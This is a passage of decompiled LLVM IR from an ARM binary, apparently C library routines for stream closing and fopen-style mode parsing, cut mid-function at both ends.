bb74:                                             ; preds = %dec_label_pc_14574.preheader, %dec_label_pc_14564.dec_label_pc_14574_crit_edge
  %v2_144c088 = phi i32 [ %v1_14564, %dec_label_pc_14564.dec_label_pc_14574_crit_edge ], [ %v1_144a4, %dec_label_pc_14574.preheader ]
  %v0_144c087 = phi i32 [ %v0_14568, %dec_label_pc_14564.dec_label_pc_14574_crit_edge ], [ %v0_1456813, %dec_label_pc_14574.preheader ]
  %v2_1457c = load i32, i32* @sb, align 4
  %v3_1457c = sub i32 %v2_144c088, %v2_1457c
  %v5_1457c = xor i32 %v2_1457c, %v2_144c088
  %v6_1457c = xor i32 %v3_1457c, %v2_144c088
  %v7_1457c = and i32 %v6_1457c, %v5_1457c
  %v8_1457c = icmp slt i32 %v7_1457c, 0
  %v9_1457c = icmp slt i32 %v3_1457c, 0
  %v10_1457c = icmp eq i32 %v2_144c088, %v2_1457c
  store i1 %v10_1457c, i1* %cpsr_z.global-to-local, align 1
  %v2_14580 = xor i1 %v9_1457c, %v8_1457c
  br i1 %v2_14580, label %dec_label_pc_144b0, label %dec_label_pc_14584

dec_label_pc_14584:                               ; preds = %dec_label_pc_14574.preheader, %bb74, %dec_label_pc_14564, %dec_label_pc_14564.dec_label_pc_14574_crit_edge, %dec_label_pc_14568.preheader
  %v0_14588 = phi i32 [ %v1_144a4, %dec_label_pc_14568.preheader ], [ %v1_144a4, %dec_label_pc_14574.preheader ], [ %v2_144c088, %bb74 ], [ %v1_14564, %dec_label_pc_14564 ], [ %v1_14564, %dec_label_pc_14564.dec_label_pc_14574_crit_edge ]
  store i32 %v3_142a8, i32* %r2.global-to-local, align 4
  %v9_14588 = icmp eq i32 %v0_14588, %v3_142a8
  store i1 %v9_14588, i1* %cpsr_z.global-to-local, align 1
  %v6_1458c = icmp slt i32 %v0_14588, %v3_142a8
  br i1 %v6_1458c, label %dec_label_pc_14590, label %dec_label_pc_1459c

dec_label_pc_14590:                               ; preds = %dec_label_pc_14584
  %v0_14590 = load i32, i32* @r8, align 4
  %v1_14590 = and i32 %v0_14590, 1048576
  %v2_14590 = icmp eq i32 %v1_14590, 0
  store i1 %v2_14590, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14590, label %dec_label_pc_142e8.backedge, label %dec_label_pc_14598

dec_label_pc_142e8.backedge:                      ; preds = %dec_label_pc_14590, %dec_label_pc_14490, %dec_label_pc_1449c
  %v0_142e8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_142e8

dec_label_pc_14598:                               ; preds = %dec_label_pc_14450, %.thread, %dec_label_pc_14590, %dec_label_pc_14284
  br label %dec_label_pc_1459c

dec_label_pc_1459c:                               ; preds = %dec_label_pc_14584, %dec_label_pc_1436c, %dec_label_pc_14598
  %v0_1459c = phi i32 [ %v0_1437c, %dec_label_pc_1436c ], [ 0, %dec_label_pc_14598 ], [ %v0_14588, %dec_label_pc_14584 ]
  store i32 %v0_1459c, i32* %r0.global-to-local, align 4
  store i32 %v3_14284, i32* @r4, align 4
  store i32 %v6_14284, i32* @r5, align 4
  store i32 %v9_14284, i32* @r6, align 4
  store i32 %v12_14284, i32* @r7, align 4
  store i32 %v15_14284, i32* @r8, align 4
  store i32 %v18_14284, i32* @sb, align 4
  store i32 %v21_14284, i32* @sl, align 4
  store i32 %v24_14284, i32* @fp, align 4
  ret i32 %v0_1459c

; uselistorder directives
  uselistorder i32 %v0_1459c, { 1, 0 }
  uselistorder i32 %v0_14588, { 0, 2, 1 }
  uselistorder i32 %v3_1457c, { 1, 0 }
  uselistorder i32 %v2_1457c, { 1, 0, 2 }
  uselistorder i32 %v2_144c088, { 0, 1, 6, 5, 2, 3, 4 }
  uselistorder i1 %v9_14578, { 1, 0 }
  uselistorder i32 %v0_14568.pre, { 0, 2, 1 }
  uselistorder i32 %v5_144fc, { 1, 0, 2, 3 }
  uselistorder i1 %v9_1457886, { 1, 0 }
  uselistorder i1 %v9_144a0, { 1, 0 }
  uselistorder i32 %v3_14478, { 0, 2, 1, 3 }
  uselistorder i1 %v7_14450, { 1, 0 }
  uselistorder i1 %v8_14448, { 1, 0 }
  uselistorder i32 %v3_14418, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_14408, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v5_143f0, { 1, 0, 2 }
  uselistorder i32 %v1_143e0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_143cc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_143c4, { 1, 0 }
  uselistorder i32 %v1_143b0, { 1, 0 }
  uselistorder i32 %v1_143ac, { 1, 0 }
  uselistorder i32 %v1_1436c, { 2, 0, 1 }
  uselistorder i32 %v0_14354, { 1, 0 }
  uselistorder i32 %v1_14344, { 0, 2, 1 }
  uselistorder i1 %v2_14474, { 1, 0, 2, 3 }
  uselistorder i32 %v1_142d0, { 2, 0, 1, 3 }
  uselistorder i32 %v1_142c4, { 2, 1, 0 }
  uselistorder i32 %v3_142ac, { 1, 0 }
  uselistorder i32 %v3_142a8, { 2, 1, 0 }
  uselistorder i32 %v1_142a0, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 4, 24, 25, 1, 2, 3, 23, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0 }
  uselistorder i32* %r2.global-to-local, { 13, 3, 14, 15, 16, 1, 2, 12, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 25, 1, 26, 27, 24, 2, 4, 3, 7, 8, 6, 5, 10, 9, 12, 11, 13, 14, 17, 15, 16, 21, 18, 19, 20, 23, 22, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 26, 27, 3, 4, 5, 28, 29, 30, 31, 32, 33, 0, 1, 2, 25, 24, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 1048576, { 2, 1, 3, 0 }
  uselistorder i32 (i8*, i32)* @function_158f4, { 1, 0 }
  uselistorder i32 92, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 (i32)* @function_15830, { 1, 0 }
  uselistorder i32* @sl, { 8, 9, 10, 11, 12, 13, 14, 40, 0, 41, 42, 15, 16, 100, 101, 102, 103, 104, 105, 106, 107, 108, 1, 109, 110, 111, 112, 113, 114, 116, 2, 115, 118, 117, 119, 120, 121, 122, 17, 18, 19, 20, 21, 22, 23, 24, 29, 30, 25, 26, 27, 28, 31, 32, 33, 34, 35, 36, 3, 37, 38, 39, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 6, 87, 88, 89, 7, 90, 91, 92, 93, 94, 95, 96, 4, 97, 98, 99, 123, 5, 124, 125, 126, 54, 55, 56 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder label %dec_label_pc_1459c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14598, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_142e8.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14584, { 1, 3, 2, 0, 4 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_14564, { 1, 0 }
  uselistorder label %bb73, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14518, { 1, 0 }
  uselistorder label %dec_label_pc_14490, { 1, 0 }
  uselistorder label %dec_label_pc_14450, { 1, 0 }
  uselistorder label %dec_label_pc_14444, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14408, { 1, 0 }
  uselistorder label %dec_label_pc_1433c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
}

define i32 @function_145ac(i32* %arg1) local_unnamed_addr {
dec_label_pc_145ac:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_145b0 = icmp eq i32* %arg1, null
  br i1 %v2_145b0, label %dec_label_pc_145d8, label %dec_label_pc_145b8

dec_label_pc_145b8:                               ; preds = %dec_label_pc_145ac
  %v2_145b8 = load i32, i32* %arg1, align 4
  %v1_145bc = inttoptr i32 %v2_145b8 to i16*
  %v2_145bc = call i32 @function_14628(i16* %v1_145bc)
  %v0_145c0 = load i32, i32* @r4, align 4
  %v1_145c0 = add i32 %v0_145c0, 20
  %v2_145c0 = inttoptr i32 %v1_145c0 to i32*
  %v3_145c0 = load i32, i32* %v2_145c0, align 4
  %v2_145c4 = icmp eq i32 %v3_145c0, 0
  br i1 %v2_145c4, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_145b8
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_145b8, %bb
  store i32 83408, i32* @lr, align 4
  %v1_145cc = xor i1 %v2_145c4, true
  call void @__pseudo_cond_branch(i1 %v1_145cc, i32 ptrtoint (i32* @global_var_12898.21 to i32))
  %v0_145d0 = load i32, i32* @r4, align 4
  store i32 %v0_145d0, i32* @r0, align 4
  %v0_145d4 = call i32 @function_12898()
  br label %dec_label_pc_145d8

dec_label_pc_145d8:                               ; preds = %dec_label_pc_145ac, %bb6
  %v1_145dc = phi i32 [ 0, %dec_label_pc_145ac ], [ %v0_145d4, %bb6 ]
  ret i32 %v1_145dc

; uselistorder directives
  uselistorder i32* null, { 0, 5, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 2, 18, 19, 20, 3, 21, 4, 22 }
  uselistorder label %dec_label_pc_145d8, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_145e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_145e0:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_145ec = load i32, i32* @r4, align 4
  store i32 %v3_145ec, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_16430.500 to i32), i32* @r1, align 4
  %v0_145f4 = call i32 @function_147dc()
  store i32 %v0_145f4, i32* %r0.global-to-local, align 4
  store i32 %v0_145f4, i32* @r4, align 4
  %v2_145f8 = icmp eq i32 %v0_145f4, 0
  br i1 %v2_145f8, label %bb, label %dec_label_pc_14604

bb:                                               ; preds = %dec_label_pc_145e0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_14604:                               ; preds = %dec_label_pc_145e0
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_1460c = call i32 @function_1214c(i32 1, i32 24)
  store i32 %v2_1460c, i32* %r0.global-to-local, align 4
  %v2_14610 = icmp eq i32 %v2_1460c, 0
  br i1 %v2_14610, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_14604
  %v1_14614 = load i32, i32* @r4, align 4
  %v3_14614 = inttoptr i32 %v2_1460c to i32*
  store i32 %v1_14614, i32* %v3_14614, align 4
  %v1_1461c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_14604, %bb4
  %v1_1461c = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_14604 ], [ %v1_1461c.pre, %bb4 ]
  %v2_14618 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14618, i32* @r4, align 4
  ret i32 %v1_1461c

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_1214c, { 33, 2, 40, 36, 35, 34, 15, 14, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 1, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 39, 38, 37 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @function_14628(i16* %arg1) local_unnamed_addr {
dec_label_pc_14628:
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14628 = load i32, i32* @r4, align 4
  store i32 %v3_14628, i32* %stack_var_-36, align 4
  %v6_14628 = load i32, i32* @r5, align 4
  %v9_14628 = load i32, i32* @r6, align 4
  %v12_14628 = load i32, i32* @r7, align 4
  %v2_1462c = add i32 %tmp, 52
  %v3_1462c = inttoptr i32 %v2_1462c to i32*
  %v4_1462c = load i32, i32* %v3_1462c, align 4
  %v1_14634 = sub i32 1, %v4_1462c
  %v2_14634 = icmp ult i32 %v4_1462c, 2
  br i1 %v2_14634, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_14628
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_14628, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_14634, %dec_label_pc_14628 ]
  %v0_1463c = phi i32 [ 0, %bb ], [ %v1_14634, %dec_label_pc_14628 ]
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  %v2_1463c = icmp eq i32 %v0_1463c, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 124804, i32* @r6, align 4
  br i1 %v2_1463c, label %dec_label_pc_14688, label %dec_label_pc_14650

dec_label_pc_14650:                               ; preds = %bb18
  %v4_14668 = load i32, i32* inttoptr (i32 124876 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_14668)
  %v0_1467c = load i32, i32* @r6, align 4
  %v2_1467c = add i32 %v0_1467c, 16
  %v3_1467c = inttoptr i32 %v2_1467c to i32*
  %v4_1467c = load i32, i32* %v3_1467c, align 4
  call void @__pseudo_branch(i32 %v4_1467c)
  %v0_14688.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14688

dec_label_pc_14688:                               ; preds = %bb18, %dec_label_pc_14650
  %v1_14690 = phi i32 [ %tmp, %bb18 ], [ %v0_14688.pre, %dec_label_pc_14650 ]
  %v1_14688 = inttoptr i32 %v1_14690 to i16*
  %v2_14688 = load i16, i16* %v1_14688, align 2
  %v3_14688 = zext i16 %v2_14688 to i32
  %v1_1468c = and i32 %v3_14688, 64
  %v2_1468c = icmp eq i32 %v1_1468c, 0
  br i1 %v2_1468c, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_14688
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_14688, %bb19
  %storemerge26 = phi i32 [ %v1_14690, %bb19 ], [ %v1_1468c, %dec_label_pc_14688 ]
  %v1_14694 = xor i1 %v2_1468c, true
  call void @__pseudo_cond_branch(i1 %v1_14694, i32 ptrtoint (i32* @global_var_14fc4.505 to i32))
  store i32 %storemerge26, i32* %sl.global-to-local, align 4
  %v0_1469c = load i32, i32* @r5, align 4
  %v1_1469c = add i32 %v0_1469c, 4
  %v2_1469c = inttoptr i32 %v1_1469c to i32*
  %v3_1469c = load i32, i32* %v2_1469c, align 4
  %v1_146a0 = call i32 @function_10dd8(i32 %v3_1469c)
  %v0_146a8 = load i32, i32* @r6, align 4
  %v2_146b4 = add i32 %v0_146a8, 108
  %v3_146b4 = inttoptr i32 %v2_146b4 to i32*
  %v4_146b4 = load i32, i32* %v3_146b4, align 4
  store i32 %v4_146b4, i32* @r7, align 4
  %v1_146bc = load i32, i32* @r5, align 4
  %v2_146bc = add i32 %v1_146bc, 4
  %v3_146bc = inttoptr i32 %v2_146bc to i32*
  store i32 -1, i32* %v3_146bc, align 4
  %v0_146c4 = load i32, i32* @r6, align 4
  %v2_146c4 = add i32 %v0_146c4, 72
  %v3_146c4 = inttoptr i32 %v2_146c4 to i32*
  %v4_146c4 = load i32, i32* %v3_146c4, align 4
  %v1_146cc = icmp slt i32 %v1_146a0, 0
  store i32 %v4_146c4, i32* %stack_var_-80, align 4
  br i1 %v1_146cc, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  call void @__pseudo_branch(i32 %v4_146c4)
  %v0_146f4 = load i32, i32* @r6, align 4
  %v2_146f4 = add i32 %v0_146f4, 16
  %v3_146f4 = inttoptr i32 %v2_146f4 to i32*
  %v4_146f4 = load i32, i32* %v3_146f4, align 4
  call void @__pseudo_branch(i32 %v4_146f4)
  %v0_14704 = load i32, i32* @r6, align 4
  %v2_14704 = add i32 %v0_14704, 12
  %v3_14704 = inttoptr i32 %v2_14704 to i32*
  %v4_14704 = load i32, i32* %v3_14704, align 4
  %v1_14708 = inttoptr i32 %v4_14704 to i32*
  %v2_14708 = load i32, i32* %v1_14708, align 4
  %v1_14710 = add i32 %v2_14708, 1
  %v2_14714 = add i32 %v0_14704, 24
  %v3_14714 = inttoptr i32 %v2_14714 to i32*
  %v4_14714 = load i32, i32* %v3_14714, align 4
  store i32 %v4_14714, i32* @r4, align 4
  store i32 %v1_14710, i32* %v1_14708, align 4
  call void @__pseudo_branch(i32 %v4_14714)
  %v0_1472c = load i32, i32* @r5, align 4
  %v1_1472c = inttoptr i32 %v0_1472c to i16*
  %v2_1472c = load i16, i16* %v1_1472c, align 2
  %v1_14730 = and i16 %v2_1472c, 24576
  %v1_14734 = or i16 %v1_14730, 48
  %v0_14738 = load i32, i32* %sb.global-to-local, align 4
  %v2_14738 = icmp eq i32 %v0_14738, 0
  store i16 %v1_14734, i16* %v1_1472c, align 2
  br i1 %v2_14738, label %.thread, label %bb23

bb23:                                             ; preds = %bb22
  br label %.thread

.thread:                                          ; preds = %bb22, %bb23
  %v2_1474c = xor i1 %v2_14738, true
  call void @__pseudo_cond_branch(i1 %v2_1474c, i32 %v4_14714)
  %v0_14750 = load i32, i32* @r5, align 4
  %v1_14750 = inttoptr i32 %v0_14750 to i16*
  %v2_14750 = load i16, i16* %v1_14750, align 2
  %v1_14754 = and i16 %v2_14750, 16384
  %v2_14754 = icmp eq i16 %v1_14754, 0
  br i1 %v2_14754, label %bb25, label %bb24

bb24:                                             ; preds = %.thread
  br label %bb25

bb25:                                             ; preds = %.thread, %bb24
  %v1_1475c = xor i1 %v2_14754, true
  call void @__pseudo_cond_branch(i1 %v1_1475c, i32 ptrtoint (i32* @global_var_12898.21 to i32))
  %v2_14768 = load i32, i32* %stack_var_-80, align 4
  call void @__pseudo_branch(i32 %v2_14768)
  call void @__pseudo_branch(i32 %v4_146f4)
  %v0_14788 = load i32, i32* @r6, align 4
  %v2_14788 = add i32 %v0_14788, 48
  %v3_14788 = inttoptr i32 %v2_14788 to i32*
  %v4_14788 = load i32, i32* %v3_14788, align 4
  %v1_1478c = inttoptr i32 %v4_14788 to i32*
  %v2_1478c = load i32, i32* %v1_1478c, align 4
  %v1_14790 = add i32 %v2_1478c, 1
  store i32 %v1_14790, i32* %v1_1478c, align 4
  call void @__pseudo_branch(i32 %v4_14714)
  %v0_147a8 = call i32 @function_14e3c()
  %v0_147ac = load i32, i32* %sl.global-to-local, align 4
  %v2_147b4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_147b4, i32* @r4, align 4
  store i32 %v6_14628, i32* @r5, align 4
  store i32 %v9_14628, i32* @r6, align 4
  store i32 %v12_14628, i32* @r7, align 4
  ret i32 %v0_147ac

; uselistorder directives
  uselistorder i1 %v2_14754, { 1, 0 }
  uselistorder i32 %v4_14714, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1462c, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0 }
  uselistorder i32 (i32)* @function_10dd8, { 9, 29, 28, 27, 32, 26, 31, 30, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 1, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_14688, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @function_147c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_147c0:
  %v0_147c0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_147c0, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_147c0
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_147c0, %bb
  %v10_147d8 = phi i32 [ %arg1, %dec_label_pc_147c0 ], [ 0, %bb ]
  ret i32 %v10_147d8

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @function_147dc() local_unnamed_addr {
dec_label_pc_147dc:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_147ec = call i32 @function_147fc()
  ret i32 %v0_147ec
}

define i32 @function_147fc() local_unnamed_addr {
dec_label_pc_147fc:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_147fc = load i32, i32* @r4, align 4
  store i32 %v3_147fc, i32* %stack_var_-36, align 4
  %v6_147fc = load i32, i32* @r5, align 4
  %v9_147fc = load i32, i32* @r6, align 4
  %v18_147fc = load i32, i32* @sb, align 4
  %v24_147fc = load i32, i32* @fp, align 4
  %v0_14800 = load i32, i32* @r1, align 4
  %v1_14800 = inttoptr i32 %v0_14800 to i8*
  %v2_14800 = load i8, i8* %v1_14800, align 1
  %v3_14800 = zext i8 %v2_14800 to i32
  store i32 %v3_14800, i32* @ip, align 4
  %v7_14808 = icmp eq i8 %v2_14800, 114
  store i32 124804, i32* @fp, align 4
  %v2_14810 = ptrtoint i32* %stack_var_-72 to i32
  %v0_14814 = load i32, i32* @r0, align 4
  store i32 %v0_14814, i32* @r6, align 4
  %v0_14818 = load i32, i32* @r2, align 4
  store i32 %v0_14818, i32* @sb, align 4
  %v0_1481c = load i32, i32* @r3, align 4
  store i32 %v0_1481c, i32* @r5, align 4
  br i1 %v7_14808, label %dec_label_pc_14868, label %dec_label_pc_14824

dec_label_pc_14824:                               ; preds = %dec_label_pc_147fc
  %v7_14824 = icmp eq i8 %v2_14800, 119
  br i1 %v7_14824, label %bb, label %dec_label_pc_14830

bb:                                               ; preds = %dec_label_pc_14824
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_1486c

dec_label_pc_14830:                               ; preds = %dec_label_pc_14824
  %v7_14830 = icmp eq i8 %v2_14800, 97
  br i1 %v7_14830, label %bb32, label %dec_label_pc_1483c

bb32:                                             ; preds = %dec_label_pc_14830
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_1486c

dec_label_pc_1483c:                               ; preds = %dec_label_pc_14830, %dec_label_pc_148f0, %dec_label_pc_148c4
  %v0_1483c = call i32 @function_11200()
  store i32 %v0_1483c, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_14844 = load i32, i32* @sb, align 4
  %v2_14844 = icmp eq i32 %v0_14844, 0
  %v2_14848 = inttoptr i32 %v0_1483c to i32*
  store i32 22, i32* %v2_14848, align 4
  br i1 %v2_14844, label %dec_label_pc_14abc, label %dec_label_pc_14850

dec_label_pc_14850:                               ; preds = %dec_label_pc_14914._crit_edge, %dec_label_pc_1483c
  %v0_14850 = load i32, i32* @sb, align 4
  %v1_14850 = inttoptr i32 %v0_14850 to i16*
  %v2_14850 = load i16, i16* %v1_14850, align 2
  %v3_14850 = zext i16 %v2_14850 to i32
  store i32 %v3_14850, i32* %r3.global-to-local, align 4
  %v1_14854 = and i32 %v3_14850, 8192
  %v2_14854 = icmp eq i32 %v1_14854, 0
  br i1 %v2_14854, label %dec_label_pc_14abc, label %dec_label_pc_1485c

dec_label_pc_1485c:                               ; preds = %dec_label_pc_14850
  store i32 %v0_14850, i32* @r0, align 4
  %v0_14860 = call i32 @function_12898()
  store i32 %v0_14860, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14abc

dec_label_pc_14868:                               ; preds = %dec_label_pc_147fc
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1486c

dec_label_pc_1486c:                               ; preds = %bb, %bb32, %dec_label_pc_14868
  %v1_14884 = phi i32 [ 1089, %bb32 ], [ 577, %bb ], [ 1, %dec_label_pc_14868 ]
  %v1_1486c = add i32 %v0_14800, 1
  %v2_1486c = inttoptr i32 %v1_1486c to i8*
  %v3_1486c = load i8, i8* %v2_1486c, align 1
  %v7_14870 = icmp eq i8 %v3_1486c, 98
  %v1_1486c.v0_14800 = select i1 %v7_14870, i32 %v1_1486c, i32 %v0_14800
  store i32 %v1_1486c.v0_14800, i32* %r3.global-to-local, align 4
  %v1_1487c = add i32 %v1_1486c.v0_14800, 1
  %v2_1487c = inttoptr i32 %v1_1487c to i8*
  %v3_1487c = load i8, i8* %v2_1487c, align 1
  %v4_1487c = zext i8 %v3_1487c to i32
  store i32 %v4_1487c, i32* @r3, align 4
  %v7_14880 = icmp eq i8 %v3_1487c, 43
  br i1 %v7_14880, label %bb35, label %.thread3

bb35:                                             ; preds = %dec_label_pc_1486c
  store i32 %v1_14884, i32* @r3, align 4
  %v2_14888 = add nuw nsw i32 %v1_14884, 1
  store i32 %v2_14888, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1486c, %bb35
  %v2_1488c = icmp eq i32 %v0_14818, 0
  br i1 %v2_1488c, label %dec_label_pc_14894, label %dec_label_pc_148bc

dec_label_pc_14894:                               ; preds = %.thread3
  store i32 80, i32* @r0, align 4
  %v0_14898 = call i32 @function_1182c()
  store i32 %v0_14898, i32* %r0.global-to-local, align 4
  store i32 %v0_14898, i32* @sb, align 4
  %v3_1489c = icmp eq i32 %v0_14898, 0
  br i1 %v3_1489c, label %dec_label_pc_14ac0, label %dec_label_pc_148a4

dec_label_pc_148a4:                               ; preds = %dec_label_pc_14894
  %v2_148a8 = add i32 %v0_14898, 8
  %v3_148a8 = inttoptr i32 %v2_148a8 to i32*
  store i32 0, i32* %v3_148a8, align 4
  store i32 8192, i32* %r3.global-to-local, align 4
  %v2_148b0 = load i32, i32* @sb, align 4
  %v3_148b0 = inttoptr i32 %v2_148b0 to i16*
  store i16 8192, i16* %v3_148b0, align 2
  %v0_148b4 = load i32, i32* @sb, align 4
  %v1_148b4 = add i32 %v0_148b4, 56
  store i32 %v1_148b4, i32* @r0, align 4
  %v1_148b8 = call i32 @function_14b6c(i32 %v1_148b4)
  store i32 %v1_148b8, i32* %r0.global-to-local, align 4
  %v0_148bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_148bc

dec_label_pc_148bc:                               ; preds = %.thread3, %dec_label_pc_148a4
  %v0_14914 = phi i32 [ %v0_1481c, %.thread3 ], [ %v0_148bc.pre, %dec_label_pc_148a4 ]
  %v1_148bc = icmp slt i32 %v0_14914, 0
  br i1 %v1_148bc, label %dec_label_pc_14914, label %dec_label_pc_148c4

dec_label_pc_148c4:                               ; preds = %dec_label_pc_148bc
  %v0_148c8 = load i32, i32* @r4, align 4
  %v2_148c8 = and i32 %v0_148c8, ptrtoint (i32* @global_var_20003.514 to i32)
  %v1_148cc = or i32 %v2_148c8, 1
  store i32 %v1_148cc, i32* %r2.global-to-local, align 4
  %v0_148d0 = load i32, i32* @r6, align 4
  %v1_148d0 = add i32 %v0_148d0, 1
  %v2_148d4 = and i32 %v1_148d0, %v1_148cc
  store i32 %v2_148d4, i32* %r3.global-to-local, align 4
  %v9_148d8 = icmp eq i32 %v2_148d4, %v1_148cc
  %v1_148dc = load i32, i32* @sb, align 4
  %v2_148dc = add i32 %v1_148dc, 4
  %v3_148dc = inttoptr i32 %v2_148dc to i32*
  store i32 %v0_14914, i32* %v3_148dc, align 4
  br i1 %v9_148d8, label %dec_label_pc_148e4, label %dec_label_pc_1483c

dec_label_pc_148e4:                               ; preds = %dec_label_pc_148c4
  %v0_148e4 = load i32, i32* @r4, align 4
  %v1_148e4 = load i32, i32* @r6, align 4
  %v2_148e4 = sub i32 -1, %v1_148e4
  %v3_148e4 = and i32 %v0_148e4, %v2_148e4
  store i32 %v3_148e4, i32* @r3, align 4
  %v1_148e8 = and i32 %v3_148e4, 1024
  %v2_148e8 = icmp eq i32 %v1_148e8, 0
  br i1 %v2_148e8, label %dec_label_pc_14908, label %dec_label_pc_148f0

dec_label_pc_148f0:                               ; preds = %dec_label_pc_148e4
  %v0_148f0 = load i32, i32* @r5, align 4
  store i32 %v0_148f0, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v2_148fc = call i32 @function_10c0c(i32 %v0_148f0, i32 4)
  store i32 %v2_148fc, i32* %r0.global-to-local, align 4
  %v2_14900 = icmp eq i32 %v2_148fc, 0
  br i1 %v2_14900, label %dec_label_pc_148f0.dec_label_pc_14908_crit_edge, label %dec_label_pc_1483c

dec_label_pc_148f0.dec_label_pc_14908_crit_edge:  ; preds = %dec_label_pc_148f0
  %v0_14908.pre = load i32, i32* @r6, align 4
  %v0_1490c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14908

dec_label_pc_14908:                               ; preds = %dec_label_pc_148f0.dec_label_pc_14908_crit_edge, %dec_label_pc_148e4
  %v0_1490c = phi i32 [ %v0_1490c.pre, %dec_label_pc_148f0.dec_label_pc_14908_crit_edge ], [ %v0_148e4, %dec_label_pc_148e4 ]
  %v0_14908 = phi i32 [ %v0_14908.pre, %dec_label_pc_148f0.dec_label_pc_14908_crit_edge ], [ %v1_148e4, %dec_label_pc_148e4 ]
